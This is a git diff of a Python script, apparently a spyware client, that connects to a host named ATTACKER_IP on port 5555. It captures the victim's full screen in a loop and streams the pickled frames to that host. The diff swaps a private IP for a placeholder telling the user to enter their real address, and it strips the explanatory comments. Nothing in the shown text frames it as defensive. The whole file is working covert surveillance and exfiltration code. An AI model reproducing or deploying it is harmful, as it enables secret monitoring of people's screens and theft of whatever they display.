@@ -5,37 +5,37 @@ import struct
 import numpy as np
 from mss import mss
 
-ATTACKER_IP = "192.168.0.103" 
+ATTACKER_IP = "I WON'T SHOW YOU MY IP" # Enter your real IP.
 PORT = 5555
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((ATTACKER_IP, PORT))
 
-# Initialize the screen capture tool
+
 sct = mss()
 
-# Use the combined primary monitor configuration instead of a dynamic list
+
 monitor = sct.monitors[0] 
 
 print("[+] Target streaming started successfully...")
 
 try:
     while True:
-        # Grab the raw pixel data directly (bypassing the buggy .shot method)
+       
         sct_img = sct.grab(monitor)
         img = np.array(sct_img)
         
-        # Downscale the image to 720p for silky smooth network transfer
+        
         img = cv2.resize(img, (1280, 720))
         
-        # Convert image to standard BGR format and drop transparency
+        
         frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
         
-        # Package and serialize the image bytes
+        
         serialized_frame = pickle.dumps(frame)
         message = struct.pack("Q", len(serialized_frame)) + serialized_frame
         
-        # Send the live video frame bytes across the connection
+        
         client.sendall(message)
         
 except Exception as e:
